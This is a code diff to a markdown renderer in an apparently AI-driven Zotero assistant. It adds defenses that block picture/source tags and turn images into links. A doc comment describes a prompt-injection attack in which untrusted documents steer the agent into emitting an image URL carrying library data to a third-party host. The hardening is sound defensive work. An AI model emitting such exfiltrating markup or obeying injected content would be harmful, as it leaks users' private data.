@@ -7,15 +7,15 @@ import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
 import Citation from '@beaver/agent-ui/chat/Citation';
 import rehypeKatex from 'rehype-katex';
 import deepmerge from 'deepmerge';
-import NoteDisplay, { StreamingNoteBlock } from './NoteDisplay';
 import { 
     preprocessCitations, 
     createPreprocessState 
 } from '../../utils/citationPreprocessing';
 import { processPartialContent } from '../../utils/markdownPartialContent';
+import { unwrapLegacyNoteTags } from '../../utils/legacyNoteTags';
 import { getHost } from '@beaver/agent-ui/host';
 import { resolveObjectIdReference } from '@beaver/agent-core/identity/libraryRef';
-import { itemLinkExportHref, parseItemLinkHref, type ItemLinkTarget } from '../../utils/itemLinks';
+import { itemLinkExportHref, parseItemLinkHref, type ItemLinkTarget } from '@beaver/agent-core/identity/itemLinks';
 import { useFindQuery } from '@beaver/agent-ui/chat/findContext';
 import { rehypeFindHighlight } from '@beaver/agent-ui/chat/rehypeFindHighlight';
 
@@ -38,9 +38,13 @@ const citationDataAttributes = [
     'data-identity-attr', 'dataIdentityAttr',
 ];
 
+// `<picture>`/`<source>` would load a remote `srcSet`, which neither the
+// sanitizer's protocol check nor `urlTransform` covers. Images are replaced by
+// `rehypeImagesAsLinks`.
+const blockedTagNames = new Set(['picture', 'source']);
+
 // Create a custom schema that extends GitHub's defaults but allows normalized citation tags.
-const customSchema = deepmerge(defaultSchema, {
-    tagNames: [...(defaultSchema.tagNames || []), 'citation'],
+const mergedSchema = deepmerge(defaultSchema, {
     attributes: {
         ...defaultSchema.attributes,
         citation: citationDataAttributes
@@ -50,6 +54,14 @@ const customSchema = deepmerge(defaultSchema, {
         href: [...(defaultSchema.protocols?.href || []), 'zotero']
     }
 });
+// `deepmerge` concatenates arrays, so the tag list is replaced after the merge.
+const customSchema = {
+    ...mergedSchema,
+    tagNames: [
+        ...(defaultSchema.tagNames || []).filter((tagName) => !blockedTagNames.has(tagName)),
+        'citation',
+    ],
+};
 
 /**
  * Extract text content from a HAST node tree.
@@ -121,6 +133,110 @@ function transformMathNodes(node: any) {
     }
 }
 
+function hasProperty(node: any, name: string): boolean {
+    return node?.type === 'element' && node.properties?.[name] !== undefined;
+}
+
+/**
+ * Rehype plugin that replaces every image with a link to it.
+ *
+ * Markdown comes from model output, which can be steered by untrusted content
+ * the agent reads (PDFs, web pages, shared notes). A remote image loads as soon
+ * as it renders, so an injected `![](https://host/?d=<library data>)` would
+ * send data to a third party without any user action. As a link, the URL is
+ * only fetched when the user clicks it. An image that is already inside a link
+ * becomes its label text, so the outer link stays the only destination.
+ * Exports apply the same rule, since notes load images too.
+ */
+function rehypeImagesAsLinks() {
+    return (tree: any) => {
+        replaceImages(tree, false);
+    };
+}
+
+function replaceImages(node: any, insideLink: boolean): void {
+    if (!node.children) return;
+    const childrenInsideLink = insideLink || (node.type === 'element' && node.tagName === 'a');
+    node.children = node.children.flatMap((child: any) => {
+        if (child.type !== 'element' || child.tagName !== 'img') {
+            replaceImages(child, childrenInsideLink);
+            return [child];
+        }
+        const { src, alt, title } = child.properties ?? {};
+        const href = typeof src === 'string' ? src : '';
+        const label = (typeof alt === 'string' && alt) || href;
+        if (!label) return [];
+        const text = { type: 'text', value: label };
+        if (childrenInsideLink || !href) return [text];
+        const properties: Record<string, unknown> = { href };
+        if (typeof title === 'string' && title) properties.title = title;
+        return [{ type: 'element', tagName: 'a', properties, children: [text] }];
+    });
+}
+
+/**
+ * Rehype plugin that rewrites GFM footnotes as endnotes a Zotero note can
+ * hold. The note editor has no footnotes and drops in-note anchors, so the
+ * chat's footnote markup would leave a "Footnotes" heading, dead links and
+ * "↩" back-references in the note. Instead:
+ *   - a reference `<sup><a href="#fn-1">1</a></sup>` becomes `<sup>1</sup>`;
+ *   - the definitions section becomes a "Notes" heading followed by its
+ *     numbered list, without the back-references.
+ */
+function rehypeZoteroNoteFootnotes() {
+    return (tree: any) => {
+        transformFootnotes(tree);
+    };
+}
+
+function transformFootnotes(node: any) {
+    if (!node.children) return;
+    const children: any[] = [];
+    let removedBackref = false;
+    // A removed back-reference leaves the space that preceded it.
+    const trimTrailingSpace = () => {
+        while (children.length > 0) {
+            const last = children[children.length - 1];
+            if (last.type !== 'text') return;
+            last.value = last.value.replace(/\s+$/, '');
+            if (last.value) return;
+            children.pop();
+        }
+    };
+    for (const child of node.children) {
+        if (hasProperty(child, 'dataFootnoteRef')) {
+            // The reference's number, without the in-note link.
+            children.push(...(child.children ?? []));
+            continue;
+        }
+        if (hasProperty(child, 'dataFootnoteBackref')) {
+            trimTrailingSpace();
+            removedBackref = true;
+            continue;
+        }
+        // Whitespace between removed back-references.
+        if (removedBackref && child.type === 'text' && !child.value.trim()) continue;
+        if (child.type === 'element' && child.tagName === 'section' && hasProperty(child, 'dataFootnotes')) {
+            const list = (child.children ?? []).find((grandchild: any) => grandchild.type === 'element' && grandchild.tagName === 'ol');
+            if (!list) continue;
+            transformFootnotes(list);
+            for (const item of list.children ?? []) {
+                if (item.type === 'element') item.properties = {};
+            }
+            children.push(
+                { type: 'element', tagName: 'h2', properties: {}, children: [{ type: 'text', value: 'Notes' }] },
+                { type: 'text', value: '\n' },
+                list,
+            );
+            continue;
+        }
+        transformFootnotes(child);
+        children.push(child);
+    }
+    if (removedBackref) trimTrailingSpace();
+    node.children = children;
+}
+
 /** Allow zotero:// URLs through react-markdown's URL sanitization */
 function urlTransform(url: string): string {
     if (url.startsWith('zotero://')) return url;
@@ -182,133 +298,16 @@ function MarkdownLink({ href, children, title, ...props }: any) {
 /** The rehype plugin list ReactMarkdown accepts, named so it can be built up. */
 type RehypePlugins = NonNullable<React.ComponentProps<typeof ReactMarkdown>['rehypePlugins']>;
 
-type Segment =
-    | { type: 'markdown', content: string }
-    | { type: 'note', data: StreamingNoteBlock };
-
 type MarkdownRendererProps = {
     content: string;
     className?: string;
     exportRendering?: boolean;
-    /** Message ID for SSE/HTTP streaming (proposed actions) */
-    messageId?: string;
-    /** Agent run ID for WebSocket streaming (agent actions) */
-    runId?: string;
-    enableNoteBlocks?: boolean;
 };
-
-/**
- * Construct a raw tag string from attributes (excluding id which is injected)
- * This is used to match against the raw_tag from agent actions.
- * 
- * IMPORTANT: Attributes are sorted alphabetically to ensure consistent matching.
- */
-function constructRawTag(tagName: string, attributes: Record<string, string>): string {
-    // Filter out 'id' attribute as it's injected by the backend, then sort
-    const attrs = Object.entries(attributes)
-        .filter(([key]) => key !== 'id')
-        .sort((a, b) => a[0].localeCompare(b[0]))
-        .map(([key, value]) => `${key}="${value}"`)
-        .join(' ');
-    return attrs ? `<${tagName} ${attrs}>` : `<${tagName}>`;
-}
-
-/**
- * Parse content into alternating segments of markdown and note blocks
- * @param content The raw content string containing markdown and note tags
- * @returns Array of segments in order of appearance
- */
-function parseContentIntoSegments(content: string): Segment[] {
-    const segments: Segment[] = [];
-    
-    // Regex to find opening note tags with attributes
-    const noteOpeningTagRegex = /<note\s+([^>]*?)>/g;
-    let lastIndex = 0;
-    let match: RegExpExecArray | null;
-    
-    while ((match = noteOpeningTagRegex.exec(content)) !== null) {
-        const openTagStart = match.index;
-        const openTagEnd = openTagStart + match[0].length;
-        const attributesStr = match[1];
-        
-        // Add markdown segment before this note (if any)
-        if (openTagStart > lastIndex) {
-            const markdownContent = content.substring(lastIndex, openTagStart);
-            if (markdownContent.trim().length > 0) {
-                segments.push({ type: 'markdown', content: markdownContent });
-            }
-        }
-        
-        // Extract attributes from the opening tag
-        const attributes: Record<string, string> = {};
-        const attrRegex = /(\w+)="([^"]*)"/g;
-        let attrMatch: RegExpExecArray | null;
-        while ((attrMatch = attrRegex.exec(attributesStr)) !== null) {
-            attributes[attrMatch[1]] = attrMatch[2];
-        }
-        
-        // Look for closing tag
-        const closingTagPattern = '</note>';
-        const closingTagIndex = content.indexOf(closingTagPattern, openTagEnd);
-        
-        let noteContent: string;
-        let isComplete: boolean;
-        let nextIndex: number;
-        
-        if (closingTagIndex !== -1) {
-            // Found closing tag
-            noteContent = content.substring(openTagEnd, closingTagIndex);
-            isComplete = true;
-            nextIndex = closingTagIndex + closingTagPattern.length;
-        } else {
-            // No closing tag - treat rest of content as note content
-            noteContent = content.substring(openTagEnd);
-            isComplete = false;
-            nextIndex = content.length;
-        }
-        
-        // Construct raw tag for matching (excludes 'id' attribute)
-        const rawTag = constructRawTag('note', attributes);
-        
-        // Create note block
-        const noteBlock: StreamingNoteBlock = {
-            id: attributes.id || '',
-            title: attributes.title,
-            itemId: attributes.item_id || null,
-            attributes,
-            content: noteContent,
-            isComplete,
-            rawTag
-        };
-        
-        segments.push({ type: 'note', data: noteBlock });
-        lastIndex = nextIndex;
-    }
-    
-    // Add any remaining markdown content after the last note
-    if (lastIndex < content.length) {
-        const markdownContent = content.substring(lastIndex);
-        if (markdownContent.trim().length > 0) {
-            segments.push({ type: 'markdown', content: markdownContent });
-        }
-    }
-    
-    // If no notes were found, return single markdown segment
-    if (segments.length === 0 && content.trim().length > 0) {
-        segments.push({ type: 'markdown', content });
-    }
-    
-    return segments;
-}
-
 
 const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function MarkdownRenderer({
     content,
     className = 'markdown',
     exportRendering = false,
-    messageId,
-    runId,
-    enableNoteBlocks = true
 }) {
     // Highlighting of find-in-chat matches. `''` whenever there is no find
     // session, so the no-query path renders exactly what it rendered before
@@ -320,14 +319,16 @@ const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function Ma
     // ReactMarkdown re-parses whenever this list changes identity, so it is
     // memoized: an unrelated parent re-render must not re-parse, and a query
     // change must re-parse exactly once. The parsing happens after the
-    // `processedSegments` memo below, which is why that one stays independent of
+    // `processedMarkdown` memo below, which is why that one stays independent of
     // the query.
     const rehypePlugins = React.useMemo(() => {
         const plugins: RehypePlugins = [
             rehypeRaw,
             [rehypeSanitize, customSchema],
+            rehypeImagesAsLinks,
             exportRendering ? rehypeZoteroMath : rehypeKatex,
         ];
+        if (exportRendering) plugins.push(rehypeZoteroNoteFootnotes);
         // Always last. The transformer inserts markup the sanitize schema does
         // not allow, so sanitizing after it would strip the highlights, and it
         // can only recognize (and skip) KaTeX output once KaTeX has produced it.
@@ -336,75 +337,40 @@ const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function Ma
     }, [findQuery, exportRendering]);
 
     // Heavy preprocessing: skip when content/flags are unchanged (e.g. parent re-render).
-    const processedSegments = React.useMemo(() => {
-        const processedContent = processPartialContent(content, exportRendering);
+    const processedMarkdown = React.useMemo(() => {
+        let markdownContent = processPartialContent(content, exportRendering);
+        // Threads predating the `create_note` tool still carry `<note>` sections.
+        markdownContent = unwrapLegacyNoteTags(markdownContent);
+        markdownContent = preprocessCitations(markdownContent, createPreprocessState());
+        return markdownContent
+            .replace(/```plaintext\s*([\s\S]*?)\s*```/, '$1')
+            .replace(/(?<!\\)\\\(((?:\\.|[^\\])*?)\\\)/g, (_, match) => `$${match}$`)
+            .replace(/(?<!\\)\\\[((?:\\.|[^\\])*?)\\\]/g, (_, match) => `$$${match}$$`)
+            .replace(/\$\$([^$]+)\$\$/g, (_, equation) => `\n$$\n${equation.trim()}\n$$\n`);
+    }, [content, exportRendering]);
 
-        const segments = enableNoteBlocks
-            ? parseContentIntoSegments(processedContent)
-            : [{ type: 'markdown' as const, content: processedContent }];
-
-        // Track citation state across all markdown segments for consecutive detection
-        const preprocessState = createPreprocessState();
-
-        return segments.map((segment) => {
-            if (segment.type === 'note') {
-                return segment;
-            }
-
-            let markdownContent = segment.content;
-            markdownContent = preprocessCitations(markdownContent, preprocessState);
-            markdownContent = markdownContent
-                .replace(/```plaintext\s*([\s\S]*?)\s*```/, '$1')
-                .replace(/(?<!\\)\\\(((?:\\.|[^\\])*?)\\\)/g, (_, match) => `$${match}$`)
-                .replace(/(?<!\\)\\\[((?:\\.|[^\\])*?)\\\]/g, (_, match) => `$$${match}$$`)
-                .replace(/\$\$([^$]+)\$\$/g, (_, equation) => `\n$$\n${equation.trim()}\n$$\n`);
-
-            return { type: 'markdown' as const, content: markdownContent };
-        });
-    }, [content, exportRendering, enableNoteBlocks]);
-
-    // Render segments
     return (
-        <div className="display-flex flex-col gap-3">
-            {processedSegments.map((segment, index) => {
-                if (segment.type === 'note') {
-                    // Use id if available, otherwise use rawTag or index for key stability
-                    const noteKey = segment.data.id || segment.data.rawTag || `${segment.data.title}-${index}`;
-                    return (
-                        <NoteDisplay
-                            key={`note-${noteKey}`}
-                            note={segment.data}
-                            messageId={messageId}
-                            runId={runId}
-                            exportRendering={exportRendering}
-                        />
-                    );
-                }
-                
-                // Render markdown segment
-                return (
-                    <div key={`markdown-${index}`} className={className}>
-                        <ReactMarkdown
-                            remarkPlugins={[remarkMath, remarkGfm]}
-                            rehypePlugins={rehypePlugins}
-                            urlTransform={exportRendering ? exportUrlTransform : urlTransform}
-                            components={{
-                                // @ts-expect-error - Custom component not in ReactMarkdown types
-                                citation: ({node, ...props}: any) => {
-                                    return <Citation {...props} exportRendering={exportRendering} />;
-                                },
-                                // Exported notes keep a plain anchor: the note editor
-                                // handles link clicks itself.
-                                ...(exportRendering ? {} : {
-                                    a: ({node, ...props}: any) => <MarkdownLink {...props} />
-                                })
-                            }}
-                        >
-                            {segment.content}
-                        </ReactMarkdown>
-                    </div>
-                );
-            })}
+        <div className={className}>
+            <ReactMarkdown
+                // Strikethrough needs `~~`: models write subscripts as `P~lac~`
+                // and approximations as `~5`, which single tildes would strike.
+                remarkPlugins={[remarkMath, [remarkGfm, { singleTilde: false }]]}
+                rehypePlugins={rehypePlugins}
+                urlTransform={exportRendering ? exportUrlTransform : urlTransform}
+                components={{
+                    // @ts-expect-error - Custom component not in ReactMarkdown types
+                    citation: ({node, ...props}: any) => {
+                        return <Citation {...props} exportRendering={exportRendering} />;
+                    },
+                    // Exported notes keep a plain anchor: the note editor
+                    // handles link clicks itself.
+                    ...(exportRendering ? {} : {
+                        a: ({node, ...props}: any) => <MarkdownLink {...props} />
+                    })
+                }}
+            >
+                {processedMarkdown}
+            </ReactMarkdown>
         </div>
     );
 });
